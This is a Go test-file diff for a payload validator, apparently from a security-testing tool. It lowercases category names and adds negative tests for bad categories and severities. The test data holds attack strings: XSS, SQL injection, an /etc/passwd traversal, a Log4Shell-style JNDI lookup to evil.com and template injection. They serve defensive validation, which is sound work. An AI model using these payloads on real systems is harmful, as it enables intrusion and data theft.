@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"testing"
 )
@@ -102,7 +103,7 @@ func TestValidateSeverities(t *testing.T) {
 
 // TestValidateCategories tests the validCategories map
 func TestValidateCategories(t *testing.T) {
-	valid := []string{"Injection", "XSS", "Traversal", "SSRF", "Auth", "GraphQL"}
+	valid := []string{"injection", "xss", "traversal", "ssrf", "auth", "graphql"}
 	for _, cat := range valid {
 		if !validCategories[cat] {
 			t.Errorf("expected %s to be valid category", cat)
@@ -478,13 +479,13 @@ func TestPayloadSchemaAllFields(t *testing.T) {
 
 // TestValidCategoriesList tests all valid categories
 func TestValidCategoriesList(t *testing.T) {
-	// All these should be valid
+	// All these should be valid (ValidCategories returns lowercase keys)
 	categories := []string{
-		"Injection", "XSS", "Traversal", "SSRF", "Auth", "Protocol",
-		"GraphQL", "Cache", "Logic", "Deserialization", "Fuzzing", "Fuzz",
-		"AI", "Media", "RateLimit", "WAF-Validation", "WAF-Bypass",
-		"Regression", "OWASP-Top10", "Obfuscation", "Bypass",
-		"Service-Specific", "Services", "Upload",
+		"injection", "xss", "traversal", "ssrf", "auth", "protocol",
+		"graphql", "cache", "logic", "deserialization", "fuzzing", "fuzz",
+		"ai", "media", "ratelimit", "waf-validation", "waf-bypass",
+		"regression", "owasp-top10", "obfuscation", "bypass",
+		"service-specific", "upload",
 	}
 
 	for _, cat := range categories {
@@ -940,5 +941,172 @@ func TestValidatorConcurrentReads(t *testing.T) {
 
 	for err := range errors {
 		t.Errorf("Concurrent validation error: %v", err)
+	}
+}
+
+// ── Negative tests: category validation ───────────────────────────────────
+
+func TestValidatorRejectsUnregisteredCategory(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	idsMapData, _ := json.Marshal(map[string]string{})
+	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)
+
+	payloads := []map[string]interface{}{
+		{
+			"id":            "neg-001",
+			"payload":       "<script>alert(1)</script>",
+			"category":      "Totally-Fake-Category",
+			"severity_hint": "High",
+			"tags":          []string{"fake"},
+			"notes":         "negative test",
+		},
+	}
+	payloadData, _ := json.Marshal(payloads)
+	os.WriteFile(filepath.Join(tmpDir, "fake.json"), payloadData, 0644)
+
+	result, _ := ValidatePayloads(tmpDir, false, false)
+
+	// Unregistered categories produce warnings (not errors — existing behavior).
+	if len(result.Warnings) == 0 {
+		t.Error("expected warning for unregistered category 'Totally-Fake-Category'")
+	}
+	found := false
+	for _, w := range result.Warnings {
+		if strings.Contains(w, "Totally-Fake-Category") {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Errorf("warning list %v does not mention 'Totally-Fake-Category'", result.Warnings)
+	}
+}
+
+func TestValidatorAdversarialCategories(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	idsMapData, _ := json.Marshal(map[string]string{})
+	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)
+
+	adversarial := []string{
+		"<script>alert(1)</script>",
+		"'; DROP TABLE categories;--",
+		"../../etc/passwd",
+		"${jndi:ldap://evil.com}",
+		"{{.Exec}}",
+		strings.Repeat("A", 10000),
+	}
+
+	var payloads []map[string]interface{}
+	for i, cat := range adversarial {
+		payloads = append(payloads, map[string]interface{}{
+			"id":            fmt.Sprintf("adv-%03d", i),
+			"payload":       "test",
+			"category":      cat,
+			"severity_hint": "High",
+			"tags":          []string{},
+			"notes":         "adversarial category test",
+		})
+	}
+	payloadData, _ := json.Marshal(payloads)
+	os.WriteFile(filepath.Join(tmpDir, "adversarial.json"), payloadData, 0644)
+
+	// Must not panic — graceful handling is the requirement.
+	result, _ := ValidatePayloads(tmpDir, false, false)
+
+	// Each adversarial category should produce a warning.
+	if len(result.Warnings) < len(adversarial) {
+		t.Errorf("expected >= %d warnings for adversarial categories, got %d",
+			len(adversarial), len(result.Warnings))
+	}
+}
+
+func TestValidatorEmptyCategory(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	idsMapData, _ := json.Marshal(map[string]string{})
+	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)
+
+	payloads := []map[string]interface{}{
+		{
+			"id":            "empty-cat-001",
+			"payload":       "test",
+			"category":      "",
+			"severity_hint": "High",
+			"tags":          []string{},
+			"notes":         "empty category test",
+		},
+	}
+	payloadData, _ := json.Marshal(payloads)
+	os.WriteFile(filepath.Join(tmpDir, "emptycat.json"), payloadData, 0644)
+
+	// Must not panic.
+	result, _ := ValidatePayloads(tmpDir, false, false)
+
+	// Empty category should produce a warning (the validator lowercases and looks up).
+	if len(result.Warnings) == 0 {
+		t.Error("expected warning for empty category")
+	}
+}
+
+func TestValidatorInvalidSeverityValues(t *testing.T) {
+	tmpDir := t.TempDir()
+
+	idsMapData, _ := json.Marshal(map[string]string{})
+	os.WriteFile(filepath.Join(tmpDir, "ids-map.json"), idsMapData, 0644)
+
+	badSeverities := []string{
+		"",
+		"CRITICAL", // wrong case (currently only Critical)
+		"Negligible",
+		"Super-High",
+		"<script>",
+		strings.Repeat("A", 1000),
+	}
+
+	var payloads []map[string]interface{}
+	for i, sev := range badSeverities {
+		payloads = append(payloads, map[string]interface{}{
+			"id":            fmt.Sprintf("badsev-%03d", i),
+			"payload":       "test",
+			"category":      "XSS",
+			"severity_hint": sev,
+			"tags":          []string{},
+			"notes":         "bad severity test",
+		})
+	}
+	payloadData, _ := json.Marshal(payloads)
+	os.WriteFile(filepath.Join(tmpDir, "badsev.json"), payloadData, 0644)
+
+	result, _ := ValidatePayloads(tmpDir, false, false)
+
+	if result.Valid {
+		t.Error("payloads with invalid severities should make result invalid")
+	}
+	// Skip checking "" since it may evaluate differently (empty string in JSON).
+	// But at least the non-empty bad severities that aren't in [Critical,High,Medium,Low]
+	// should be flagged.
+	if len(result.InvalidSeverities) < 3 {
+		t.Errorf("expected >= 3 invalid severities, got %d: %v",
+			len(result.InvalidSeverities), result.InvalidSeverities)
+	}
+}
+
+func TestValidCategoriesRejectsGarbage(t *testing.T) {
+	garbage := []string{
+		"not-a-real-category",
+		"<script>",
+		"'; DROP TABLE--",
+		"",
+		"   ",
+		"\x00",
+		"AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+	}
+
+	for _, g := range garbage {
+		if validCategories[g] {
+			t.Errorf("validCategories should not contain garbage input %q", g)
+		}
 	}
 }
